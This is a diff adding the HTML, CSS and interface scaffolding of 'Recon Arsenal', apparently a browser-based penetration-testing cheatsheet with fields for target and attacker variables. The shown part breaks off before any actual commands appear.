@@ -1,0 +1,1260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Recon Arsenal — eusebio@it-sec</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono:wght@300;400;500&family=Outfit:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --void:#070809;--bg2:#0d0f13;--card:#13161d;--card2:#191d26;
+  --border:rgba(255,255,255,.07);--line-2:rgba(255,255,255,.14);
+  --text:#e7ebf2;--soft:#8a93a3;--muted:#525c6b;--dim:#2a303a;
+  /* Accent: lime — Recon Arsenal identity */
+  --accent:#a3e635;--accent-dim:rgba(163,230,53,.12);--accent-glow:rgba(163,230,53,.25);
+  --accent-hi:#bef264;
+  /* Semantic colours — untouched */
+  --blue:#1a8cff;--cyan:#00d4ff;--red:#ff3d3d;--green:#00e676;
+  --orange:#ffa657;--yellow:#ffd54f;--purple:#c084fc;--lime:#a3e635;
+  --teal:#2dd4bf;--pink:#f472b6;
+}
+#bg-canvas{position:fixed;inset:0;width:100%;height:100%;z-index:0;pointer-events:none;opacity:.5}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--void);color:var(--text);font-family:'Outfit',sans-serif;font-size:14px;line-height:1.65;overflow-x:hidden;min-height:100vh}
+
+/* ── NAV ── */
+nav{position:fixed;top:0;left:0;right:0;z-index:300;display:flex;align-items:center;justify-content:space-between;padding:0 24px;height:48px;background:rgba(7,8,9,.65);backdrop-filter:blur(18px);border-bottom:1px solid var(--border)}
+.nav-brand{font-family:'JetBrains Mono',monospace;font-size:13px;display:flex;align-items:center;gap:2px;text-decoration:none;color:var(--text)}
+.nu{color:#79c0ff}.na{color:var(--muted)}.nh{color:var(--cyan)}.nt{color:var(--orange)}.nd{color:var(--accent);margin-left:4px}
+.nc{display:inline-block;width:7px;height:13px;background:var(--accent);margin-left:3px;vertical-align:middle;animation:blink .9s steps(1) infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.nav-center{display:flex;align-items:center;gap:10px}
+.nav-badge{font-family:'JetBrains Mono',monospace;font-size:9px;padding:2px 9px;border-radius:4px;background:rgba(163,230,53,.1);color:var(--accent);border:1px solid rgba(163,230,53,.25);letter-spacing:.06em}
+.nav-local{display:inline-flex;align-items:center;gap:5px;font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted);border:1px solid var(--border);border-radius:4px;padding:2px 8px;cursor:default;position:relative}
+.nav-local::before{content:'●';color:var(--green);font-size:8px}
+.nav-local:hover .nav-tooltip,.nav-local:focus .nav-tooltip{opacity:1;pointer-events:auto}
+.nav-tooltip{position:absolute;top:calc(100% + 8px);left:50%;transform:translateX(-50%);background:var(--card2);border:1px solid var(--border);border-radius:6px;padding:7px 11px;font-size:11px;color:var(--soft);white-space:nowrap;opacity:0;pointer-events:none;transition:opacity .2s;z-index:400}
+.nav-right{display:flex;align-items:center;gap:8px}
+.nav-btn{padding:4px 12px;font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.08em;text-transform:uppercase;cursor:pointer;border:1px solid var(--border);background:transparent;color:var(--muted);transition:all .2s;border-radius:5px}
+.nav-btn:hover{border-color:var(--accent);color:var(--accent)}
+.nav-btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.nav-btn.clear-btn{color:var(--muted)}
+.nav-btn.clear-btn:hover{border-color:var(--red);color:var(--red)}
+.nav-back{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted);text-decoration:none;letter-spacing:.08em;text-transform:uppercase;transition:color .2s;padding:4px 8px}
+.nav-back:hover{color:var(--accent)}
+.nav-back:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:3px}
+
+/* ── VAR BAR ── */
+.var-bar{position:fixed;top:48px;left:0;right:0;z-index:200;background:rgba(13,15,19,.82);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);display:flex;flex-wrap:wrap;align-items:center;gap:8px;padding:9px clamp(10px,2vw,16px)}
+.vb-item{display:inline-flex;align-items:center;gap:2px;min-height:32px;flex-shrink:0;background:rgba(255,255,255,.025);border:1px solid var(--border);border-radius:8px;padding:5px 12px;transition:border-color .15s,background .15s}
+.vb-item:focus-within{border-color:var(--accent);background:rgba(255,255,255,.05)}
+.vb-label{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted);padding:0 7px 0 0;letter-spacing:.06em;white-space:nowrap;text-transform:uppercase}
+.vb-input{background:transparent;border:none;outline:none;color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:11.5px;padding:0;letter-spacing:.04em;transition:color .15s;min-width:0}
+.vb-input::placeholder{color:var(--dim)}
+.vb-input:focus{color:var(--text)}
+.var-bar-right{margin-left:auto;display:flex;align-items:center;gap:8px;min-height:32px;flex-shrink:0}
+.vbr-btn{display:inline-flex;align-items:center;justify-content:center;padding:0 14px;height:32px;border-radius:8px;border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.08em;text-transform:uppercase;background:rgba(255,255,255,.025);cursor:pointer;color:var(--muted);transition:all .2s;white-space:nowrap}
+.vbr-btn:hover{color:var(--text);background:rgba(255,255,255,.06);border-color:var(--line-2)}
+.vbr-btn.help{color:var(--accent);background:rgba(163,230,53,.06);border-color:rgba(163,230,53,.25)}
+.vbr-btn.help:hover{background:rgba(163,230,53,.12)}
+.vbr-btn.clr:hover{color:var(--red);border-color:rgba(255,61,61,.3)}
+.vbr-btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+
+/* ── MAIN LAYOUT ── */
+.app-shell{display:grid;grid-template-columns:220px 1fr 430px;height:calc(100vh - 84px);margin-top:84px;position:relative;z-index:2}/*JS overrides margin-top/height to match actual var-bar height once it wraps*/
+
+/* ── SIDEBAR ── */
+.sidebar{border-right:1px solid var(--border);background:rgba(13,15,19,.82);backdrop-filter:blur(10px);overflow-y:auto;display:flex;flex-direction:column}
+.sidebar::-webkit-scrollbar{width:3px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--dim)}
+.sb-search{padding:8px 10px;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--bg2);z-index:5}
+.sb-search-input{width:100%;background:var(--card);border:1px solid var(--border);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:11px;padding:6px 10px;outline:none;transition:border-color .2s;border-radius:5px}
+.sb-search-input:focus{border-color:var(--accent)}
+.sb-search-input::placeholder{color:var(--dim)}
+.sb-search-input:focus-visible{outline:none}
+.sb-all{display:flex;align-items:center;justify-content:space-between;padding:7px 10px 6px;cursor:pointer;transition:background .15s;border-bottom:1px solid var(--border)}
+.sb-all:hover{background:rgba(255,255,255,.03)}
+.sb-all.active{background:rgba(163,230,53,.06)}
+.sb-all.active .sb-all-label{color:var(--accent)}
+.sb-all:focus-visible{outline:2px solid var(--accent);outline-offset:-2px}
+.sb-all-label{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:500;color:var(--soft);letter-spacing:.04em}
+.sb-all-count{font-family:'JetBrains Mono',monospace;font-size:10px;padding:1px 7px;background:rgba(255,255,255,.05);color:var(--muted);border-radius:3px}
+.sb-cat{display:flex;align-items:center;justify-content:space-between;padding:6px 10px;cursor:pointer;transition:background .15s;gap:8px}
+.sb-cat:hover{background:rgba(255,255,255,.025)}
+.sb-cat.active{background:rgba(163,230,53,.06)}
+.sb-cat.active .sb-cat-label{color:var(--accent)}
+.sb-cat.active .sb-cat-dot{opacity:1}
+.sb-cat:focus-visible{outline:2px solid var(--accent);outline-offset:-2px}
+.sb-cat-left{display:flex;align-items:center;gap:6px}
+.sb-cat-dot{width:5px;height:5px;border-radius:50%;flex-shrink:0;opacity:.4;transition:opacity .2s}
+.sb-cat-label{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--soft);letter-spacing:.03em;white-space:nowrap}
+.sb-cat-count{font-family:'JetBrains Mono',monospace;font-size:9px;padding:1px 5px;background:rgba(255,255,255,.04);color:var(--dim);border-radius:3px;flex-shrink:0}
+
+/* ── CENTER ── */
+.center{overflow-y:auto;background:transparent;display:flex;flex-direction:column}
+.center::-webkit-scrollbar{width:3px}
+.center::-webkit-scrollbar-thumb{background:var(--dim)}
+.center-header{padding:8px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:9px;position:sticky;top:0;background:rgba(7,8,9,.62);backdrop-filter:blur(18px);z-index:5;flex-wrap:wrap;min-height:38px}
+.ch-title{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text);letter-spacing:.05em;white-space:nowrap}
+.ch-count{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted)}
+.ch-filters{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap;overflow-x:auto;max-width:100%}
+.ch-tag-filter{font-family:'JetBrains Mono',monospace;font-size:9px;padding:2px 7px;border:1px solid var(--border);color:var(--muted);cursor:pointer;transition:all .15s;letter-spacing:.04em;border-radius:3px;white-space:nowrap;background:transparent}
+.ch-tag-filter:hover{border-color:var(--soft);color:var(--text)}
+.ch-tag-filter.active{border-color:var(--accent);color:var(--accent);background:rgba(163,230,53,.07)}
+.ch-tag-filter:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+
+/* ── CHEAT CARDS ── */
+.cards-wrap{padding:8px 10px;display:flex;flex-direction:column;gap:3px}
+.cheat-card{background:var(--card);border:1px solid var(--border);padding:9px 11px;cursor:pointer;transition:all .15s;position:relative;overflow:hidden;border-radius:7px}
+.cheat-card:hover{background:var(--card2);border-color:var(--line-2)}
+.cheat-card.selected{border-color:var(--accent);background:rgba(163,230,53,.04)}
+.cheat-card.selected::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:var(--accent);border-radius:2px 0 0 2px}
+.cheat-card:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.cc-top{display:flex;align-items:flex-start;gap:7px;margin-bottom:4px}
+.cc-icon{font-size:13px;flex-shrink:0;line-height:1.2}
+.cc-title{font-size:12px;font-weight:600;color:var(--text);flex:1;line-height:1.3}
+.cc-desc{font-size:11px;color:var(--muted);line-height:1.5;margin-bottom:5px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.cc-tags{display:flex;gap:3px;flex-wrap:wrap}
+.cc-tag{font-family:'JetBrains Mono',monospace;font-size:9px;padding:1px 6px;border-radius:3px}
+.tag-recon  {background:rgba(45,212,191,.1);color:var(--teal);border:1px solid rgba(45,212,191,.25)}
+.tag-enum   {background:rgba(26,140,255,.1);color:var(--blue);border:1px solid rgba(26,140,255,.25)}
+.tag-exploit{background:rgba(255,61,61,.1);color:var(--red);border:1px solid rgba(255,61,61,.25)}
+.tag-creds  {background:rgba(255,166,87,.1);color:var(--orange);border:1px solid rgba(255,166,87,.25)}
+.tag-privesc{background:rgba(192,132,252,.1);color:var(--purple);border:1px solid rgba(192,132,252,.25)}
+.tag-lateral{background:rgba(163,230,53,.1);color:var(--lime);border:1px solid rgba(163,230,53,.25)}
+.tag-shell  {background:rgba(244,114,182,.1);color:var(--pink);border:1px solid rgba(244,114,182,.25)}
+.tag-web    {background:rgba(255,213,79,.08);color:var(--yellow);border:1px solid rgba(255,213,79,.2)}
+.tag-domain {background:rgba(0,212,255,.08);color:var(--cyan);border:1px solid rgba(0,212,255,.2)}
+.tag-ai     {background:rgba(163,230,53,.08);color:var(--lime);border:1px solid rgba(163,230,53,.2)}
+.tag-kerberos{background:rgba(192,132,252,.08);color:var(--purple);border:1px solid rgba(192,132,252,.2)}
+.tag-smb    {background:rgba(255,166,87,.08);color:var(--orange);border:1px solid rgba(255,166,87,.2)}
+.tag-snmp   {background:rgba(0,212,255,.08);color:var(--cyan);border:1px solid rgba(0,212,255,.2)}
+.tag-cloud  {background:rgba(26,140,255,.1);color:var(--blue);border:1px solid rgba(26,140,255,.25)}
+.tag-k8s    {background:rgba(45,212,191,.1);color:var(--teal);border:1px solid rgba(45,212,191,.25)}
+.tag-adcs   {background:rgba(0,230,118,.1);color:var(--green);border:1px solid rgba(0,230,118,.25)}
+.tag-osint  {background:rgba(255,213,79,.1);color:var(--yellow);border:1px solid rgba(255,213,79,.25)}
+.tag-supply {background:rgba(244,114,182,.1);color:var(--pink);border:1px solid rgba(244,114,182,.25)}
+.tag-token  {background:rgba(192,132,252,.1);color:var(--purple);border:1px solid rgba(192,132,252,.25)}
+.tag-iam    {background:rgba(163,230,53,.1);color:var(--lime);border:1px solid rgba(163,230,53,.25)}
+
+/* ── RIGHT PANEL ── */
+.right-panel{border-left:1px solid var(--border);background:rgba(13,15,19,.82);backdrop-filter:blur(10px);display:flex;flex-direction:column;overflow:hidden}
+.rp-header{padding:9px 13px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;background:rgba(13,15,19,.98);flex-shrink:0}
+.rp-header h3{font-family:'Syne',sans-serif;font-size:15px;font-weight:700;letter-spacing:.03em;flex:1}
+.rp-header h3 span{color:var(--accent)}
+.rp-close{background:transparent;border:1px solid var(--border);color:var(--muted);cursor:pointer;font-size:13px;line-height:1;transition:all .2s;padding:2px 7px;border-radius:4px}
+.rp-close:hover{color:var(--red);border-color:rgba(255,61,61,.4)}
+.rp-close:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+
+/* SELECTED CARD INFO */
+.rp-info{padding:10px 13px;border-bottom:1px solid var(--border);flex-shrink:0}
+.rp-info-title{font-size:13px;font-weight:600;color:var(--text);margin-bottom:3px}
+.rp-info-desc{font-size:11px;color:var(--soft);line-height:1.6}
+.rp-info-tags{display:flex;gap:4px;flex-wrap:wrap;margin-top:6px}
+
+/* VARIANTS */
+.variants-wrap{flex:1;overflow-y:auto;padding:10px 13px}
+.variants-wrap::-webkit-scrollbar{width:3px}
+.variants-wrap::-webkit-scrollbar-thumb{background:var(--dim)}
+.variant-block{margin-bottom:12px}
+.vb-label-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:5px}
+.vb-name{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:.08em;text-transform:uppercase}
+.vb-actions{display:flex;gap:3px}
+.vb-copy-btn{padding:3px 9px;font-family:'JetBrains Mono',monospace;font-size:9px;letter-spacing:.08em;text-transform:uppercase;background:transparent;border:1px solid var(--border);color:var(--muted);cursor:pointer;transition:all .15s;border-radius:4px}
+.vb-copy-btn:hover{border-color:var(--accent);color:var(--accent)}
+.vb-copy-btn.copied{border-color:var(--green);color:var(--green)}
+.vb-copy-btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.vb-enter-btn{padding:3px 9px;font-family:'JetBrains Mono',monospace;font-size:9px;letter-spacing:.08em;text-transform:uppercase;background:rgba(163,230,53,.07);border:1px solid rgba(163,230,53,.25);color:var(--accent);cursor:pointer;transition:all .15s;border-radius:4px}
+.vb-enter-btn:hover{background:rgba(163,230,53,.14)}
+.vb-enter-btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.cmd-block{background:rgba(0,0,0,.45);border:1px solid var(--border);padding:10px 12px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.8;color:var(--text);position:relative;white-space:pre-wrap;word-break:break-all;cursor:pointer;transition:border-color .15s;border-radius:6px}
+.cmd-block:hover{border-color:rgba(163,230,53,.3)}
+.cmd-block:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.var-highlight{color:var(--accent);font-weight:500}
+.cmd-comment{color:var(--dim)}
+.cmd-flag{color:var(--cyan)}
+.cmd-url{color:var(--blue)}
+
+/* EMPTY STATE */
+.rp-empty{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;opacity:.4}
+.rpe-big{font-family:'Syne',sans-serif;font-size:52px;font-weight:800;color:var(--dim);line-height:1}
+.rpe-mono{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:.08em;text-align:center}
+
+/* ── MODAL ── */
+.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.78);z-index:800;align-items:center;justify-content:center;backdrop-filter:blur(5px);padding:24px}
+.modal-bg.show{display:flex}
+.modal{background:var(--bg2);border:1px solid rgba(163,230,53,.18);max-width:700px;width:100%;max-height:82vh;overflow-y:auto;position:relative;border-radius:12px}
+.modal::-webkit-scrollbar{width:3px}.modal::-webkit-scrollbar-thumb{background:var(--dim)}
+.modal-header{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--bg2);z-index:1;border-radius:12px 12px 0 0}
+.modal-header h2{font-family:'Syne',sans-serif;font-size:20px;font-weight:800;letter-spacing:.03em}
+.modal-header h2 span{color:var(--accent)}
+.modal-close{background:transparent;border:1px solid var(--border);color:var(--muted);cursor:pointer;font-size:14px;line-height:1;transition:all .2s;padding:3px 8px;border-radius:5px}
+.modal-close:hover{color:var(--red);border-color:rgba(255,61,61,.4)}
+.modal-close:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.modal-body{padding:18px}
+.modal-body h3{font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin:16px 0 7px;display:flex;align-items:center;gap:7px}
+.modal-body h3::before{content:'//';color:var(--dim);font-size:9px}
+.modal-body h3:first-child{margin-top:0}
+.modal-body p,.modal-body li{font-size:13px;color:var(--soft);line-height:1.8}
+.modal-body ul{padding-left:14px;margin-bottom:10px}
+.modal-body li::marker{color:var(--accent)}
+.modal-body strong{color:var(--text);font-weight:500}
+.modal-body .kbd{font-family:'JetBrains Mono',monospace;font-size:10px;background:var(--card);border:1px solid var(--border);padding:1px 7px;color:var(--text);border-radius:3px}
+.modal-body .ex-block{background:var(--card);border:1px solid var(--border);padding:9px 12px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--accent);line-height:1.7;margin-top:5px;border-radius:6px}
+.modal-body .var-table{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
+.modal-body .var-table th{font-family:'JetBrains Mono',monospace;font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);padding:6px 10px;text-align:left;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02)}
+.modal-body .var-table td{padding:7px 10px;border-bottom:1px solid rgba(255,255,255,.03);color:var(--soft);font-size:12px}
+.modal-body .var-table td:first-child{font-family:'JetBrains Mono',monospace;color:var(--accent)}
+
+/* ── TOAST ── */
+.toast-wrap{position:fixed;bottom:20px;right:20px;z-index:9000;display:flex;flex-direction:column;gap:6px;pointer-events:none}
+.toast{display:flex;align-items:center;gap:8px;padding:9px 14px;background:var(--card2);border:1px solid rgba(163,230,53,.3);border-radius:7px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--accent);letter-spacing:.06em;pointer-events:none;animation:tSlide .2s ease;box-shadow:0 6px 24px rgba(0,0,0,.5)}
+@keyframes tSlide{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* ── PRINT ── */
+@media print{
+  html,body{background:#fff !important}
+  #bg-canvas,#bg-glow,nav,.var-bar,.sidebar,.right-panel,.modal-bg,.toast-wrap{display:none !important}
+  .app-shell{display:block !important;margin-top:0 !important;height:auto !important}
+  .center{overflow:visible !important;height:auto !important}
+  .center-header{position:static !important;background:#fff !important}
+  .cheat-card{break-inside:avoid;background:#fff !important;border-color:#ddd !important;border-radius:0 !important;margin-bottom:8px}
+  .cheat-card.selected::before{background:#888 !important}
+  .cc-title{color:#000 !important}.cc-desc{color:#444 !important}
+  @page{margin:1.5cm;size:A4}
+}
+
+/* ── RESPONSIVE ── */
+@media(max-width:1100px){.app-shell{grid-template-columns:180px 1fr 380px}}
+@media(max-width:900px){
+  .right-panel{display:none}
+  .app-shell{grid-template-columns:1fr;height:auto;min-height:calc(100vh - 84px)}
+  .sidebar{position:static;height:auto;border-right:none;border-bottom:1px solid var(--border)}
+  .center{height:auto;overflow-y:visible}
+  .nav-center{display:none}
+  .el-terminal{min-width:0 !important;width:100% !important}
+}
+@media(max-width:600px){
+  .sidebar{display:none}
+  nav{padding:0 12px}
+  .vb-label{display:none}
+  .var-bar-right{width:100%;justify-content:flex-end}
+}
+</style>
+</head>
+<body>
+
+<!-- BG CANVAS -->
+<canvas id="bg-canvas"></canvas>
+<div id="bg-glow" style="position:fixed;inset:0;z-index:0;pointer-events:none;background:radial-gradient(ellipse 80% 50% at 50% 30%,rgba(163,230,53,.03) 0%,transparent 70%)"></div>
+
+<!-- TOAST -->
+<div class="toast-wrap" id="toastWrap"></div>
+
+<!-- MODAL -->
+<div class="modal-bg" id="instructionsModal" role="dialog" aria-modal="true" aria-label="How to use Recon Arsenal">
+  <div class="modal">
+    <div class="modal-header">
+      <h2>HOW TO <span>USE</span></h2>
+      <button class="modal-close" id="modalClose" aria-label="Close">&#10005;</button>
+    </div>
+    <div class="modal-body">
+      <h3>Overview</h3>
+      <p>Recon Arsenal is an all-in-one enumeration cheatsheet with live variable substitution. Fill in your target variables in the top bar and every command updates automatically. Click any command to copy it.</p>
+
+      <h3>Variable Bar</h3>
+      <p>Every <code style="font-family:'JetBrains Mono',monospace;font-size:11px;background:var(--card);padding:1px 6px;color:var(--accent);border-radius:3px">{VARIABLE}</code> in commands is automatically replaced as you type.</p>
+      <table class="var-table">
+        <thead><tr><th>Variable</th><th>Description</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>{IP}</td><td>Target IP address</td><td>10.10.14.166</td></tr>
+          <tr><td>{DOMAIN}</td><td>Target domain name</td><td>vesper.local</td></tr>
+          <tr><td>{USER}</td><td>Username</td><td>jsmith</td></tr>
+          <tr><td>{PASS}</td><td>Password</td><td>Password123!</td></tr>
+          <tr><td>{PORT}</td><td>Target port</td><td>80</td></tr>
+          <tr><td>{LHOST}</td><td>Your attacker IP</td><td>10.10.14.1</td></tr>
+          <tr><td>{LPORT}</td><td>Your listener port</td><td>4444</td></tr>
+          <tr><td>{WORDLIST}</td><td>Wordlist path</td><td>/usr/share/wordlists/dirb/common.txt</td></tr>
+          <tr><td>{DC}</td><td>Domain controller IP or hostname</td><td>10.10.14.166</td></tr>
+          <tr><td>{HASH}</td><td>NTLM hash (NT:LM or full)</td><td>aad3b435b51...</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Navigating Categories</h3>
+      <ul>
+        <li>Use the <strong>left sidebar</strong> to filter by technique category</li>
+        <li>Use the <strong>tag filters</strong> in the header bar to filter by tag</li>
+        <li>Use the <strong>search box</strong> to find any command by name, description, or tag</li>
+        <li>Click <strong>All</strong> to see every cheat across all categories</li>
+      </ul>
+
+      <h3>Using Commands</h3>
+      <ul>
+        <li>Click any card to <strong>open the full command</strong> in the right panel</li>
+        <li>Click a command block or <strong>Copy</strong> to copy to clipboard</li>
+        <li><strong>Copy+Enter</strong> copies the command with a newline (paste and run)</li>
+        <li>Commands show multiple variants where available</li>
+      </ul>
+
+      <h3>Keyboard Shortcuts</h3>
+      <ul>
+        <li><span class="kbd">Ctrl + K</span> &nbsp;— Focus search</li>
+        <li><span class="kbd">Esc</span> &nbsp;— Clear selection / close panel</li>
+        <li><span class="kbd">↑ ↓</span> &nbsp;— Navigate cards when search is focused</li>
+        <li><span class="kbd">?</span> &nbsp;— Open this help modal</li>
+      </ul>
+
+      <h3>Tips</h3>
+      <ul>
+        <li>Variables not yet filled show as <span style="color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:11px">{PLACEHOLDER}</span> — fill the var bar first</li>
+        <li>The <strong>AI / LLM Enum</strong> category has Claude-powered prompt templates</li>
+        <li>All data stays in your browser — nothing is sent anywhere</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- NAV -->
+<nav>
+  <a href="index.html" class="nav-brand">
+    <span class="nu">eusebio</span><span class="na">@</span><span class="nh">it-sec</span><span class="na">:</span><span class="nt">~</span><span class="nd">$</span><span class="nc"></span>
+  </a>
+  <div class="nav-center">
+    <span class="nav-badge">recon-arsenal</span>
+    <span class="nav-local" tabindex="0" aria-label="Runs entirely in your browser — no data is uploaded or sent anywhere">Local-only
+      <span class="nav-tooltip">Runs entirely in your browser — no data is uploaded or sent anywhere</span>
+    </span>
+  </div>
+  <div class="nav-right">
+    <button class="nav-btn" id="helpBtn" aria-label="Open help">? Help</button>
+    <button class="nav-btn clear-btn" id="clearGlobalsBtn">&#10005; Clear Vars</button>
+    <a href="projects.html" class="nav-back">&#8592; Projects</a>
+  </div>
+</nav>
+
+<!-- VAR BAR -->
+<div class="var-bar" id="varBar" role="toolbar" aria-label="Target variables">
+  <div class="vb-item"><span class="vb-label">lhost</span><input class="vb-input" id="v_LHOST" placeholder="10.10.14.1" style="width:108px" aria-label="LHOST — attacker IP"/></div>
+  <div class="vb-item"><span class="vb-label">lport</span><input class="vb-input" id="v_LPORT" placeholder="4444" style="width:62px" aria-label="LPORT — listener port"/></div>
+  <div class="vb-item"><span class="vb-label">ip</span><input class="vb-input" id="v_IP" placeholder="10.10.14.166" style="width:108px" aria-label="IP — target IP"/></div>
+  <div class="vb-item"><span class="vb-label">port</span><input class="vb-input" id="v_PORT" placeholder="80" style="width:54px" aria-label="PORT — target port"/></div>
+  <div class="vb-item"><span class="vb-label">domain</span><input class="vb-input" id="v_DOMAIN" placeholder="vesper.local" style="width:118px" aria-label="DOMAIN — target domain"/></div>
+  <div class="vb-item"><span class="vb-label">dc</span><input class="vb-input" id="v_DC" placeholder="10.10.14.166" style="width:108px" aria-label="DC — domain controller IP"/></div>
+  <div class="vb-item"><span class="vb-label">user</span><input class="vb-input" id="v_USER" placeholder="jsmith" style="width:88px" aria-label="USER — username"/></div>
+  <div class="vb-item"><span class="vb-label">pass</span><input class="vb-input" id="v_PASS" placeholder="Password123!" style="width:108px" aria-label="PASS — password"/></div>
+  <div class="vb-item"><span class="vb-label">hash (NT)</span><input class="vb-input" id="v_HASH" placeholder="aad3b435b51..." style="width:128px" aria-label="HASH — NTLM hash"/></div>
+  <div class="vb-item"><span class="vb-label">wordlist</span><input class="vb-input" id="v_WORDLIST" placeholder="/usr/share/wordlists/..." style="width:198px" aria-label="WORDLIST — wordlist path"/></div>
+  <div class="var-bar-right">
+    <button class="vbr-btn help" id="helpBtn2">? How to use</button>
+    <button class="vbr-btn clr" id="clearVarsBtn">Clear</button>
+  </div>
+</div>
+
+<!-- APP SHELL -->
+<div class="app-shell">
+
+  <!-- SIDEBAR -->
+  <div class="sidebar" role="navigation" aria-label="Categories">
+    <div class="sb-search">
+      <input class="sb-search-input" id="searchInput" placeholder="Search cheats… (Ctrl+K)" autocomplete="off" aria-label="Search cheats"/>
+    </div>
+    <div class="sb-all active" id="cat-all" data-cat="all" tabindex="0" role="button" aria-label="All categories">
+      <span class="sb-all-label">All</span>
+      <span class="sb-all-count" id="count-all">0</span>
+    </div>
+    <div id="catList"></div>
+  </div>
+
+  <!-- CENTER -->
+  <div class="center" role="main">
+    <div class="center-header">
+      <span class="ch-title" id="activeLabel">All Cheats</span>
+      <span class="ch-count" id="visibleCount"></span>
+      <div class="ch-filters" id="tagFilters" role="group" aria-label="Tag filters"></div>
+    </div>
+    <div class="cards-wrap" id="cardsWrap" role="list"></div>
+  </div>
+
+  <!-- RIGHT PANEL -->
+  <div class="right-panel" id="rightPanel" role="complementary" aria-label="Command detail">
+    <div class="rp-empty" id="rpEmpty">
+      <div class="rpe-big">SELECT</div>
+      <p class="rpe-mono">click any cheat card<br>to view commands</p>
+    </div>
+    <div id="rpContent" style="display:none;flex-direction:column;flex:1;overflow:hidden">
+      <div class="rp-header">
+        <h3 id="rpTitle">Title <span>Here</span></h3>
+        <button class="rp-close" id="rpClose" aria-label="Close detail panel">&#10005;</button>
+      </div>
+      <div class="rp-info" id="rpInfo"></div>
+      <div class="variants-wrap" id="rpVariants"></div>
+    </div>
+  </div>
+
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function(){
+'use strict';
+
+/* ── THREE.JS BACKGROUND ── */
+(function(){
+  var canvas=document.getElementById('bg-canvas');
+  if(!canvas||typeof THREE==='undefined')return;
+  var renderer;
+  try{renderer=new THREE.WebGLRenderer({canvas:canvas,alpha:true,antialias:true});}catch(e){canvas.style.display='none';return;}
+  if(window.matchMedia('(prefers-reduced-motion: reduce)').matches){canvas.style.opacity='.2';}
+  renderer.setPixelRatio(Math.min(devicePixelRatio,2));
+  renderer.setSize(innerWidth,innerHeight);
+  var scene=new THREE.Scene(),camera=new THREE.PerspectiveCamera(60,innerWidth/innerHeight,1,400);
+  camera.position.z=60;
+  var group=new THREE.Group();scene.add(group);
+  var N=innerWidth<760?55:120,R=40,base=new Float32Array(N*3),pos=new Float32Array(N*3),col=new Float32Array(N*3);
+  var C=new THREE.Color(0xa3e635);var C2=new THREE.Color(0x00d4ff);
+  for(var i=0;i<N;i++){
+    base[i*3]=(Math.random()*2-1)*R*1.9;
+    base[i*3+1]=(Math.random()*2-1)*R*1.2;
+    base[i*3+2]=(Math.random()*2-1)*R*0.6;
+    var c=Math.random()<0.3?C2:C;
+    col[i*3]=c.r;col[i*3+1]=c.g;col[i*3+2]=c.b;
+  }
+  var sc=document.createElement('canvas');sc.width=sc.height=64;
+  var sx=sc.getContext('2d');
+  var g=sx.createRadialGradient(32,32,0,32,32,32);
+  g.addColorStop(0,'rgba(255,255,255,1)');
+  g.addColorStop(.4,'rgba(255,255,255,.5)');
+  g.addColorStop(1,'rgba(255,255,255,0)');
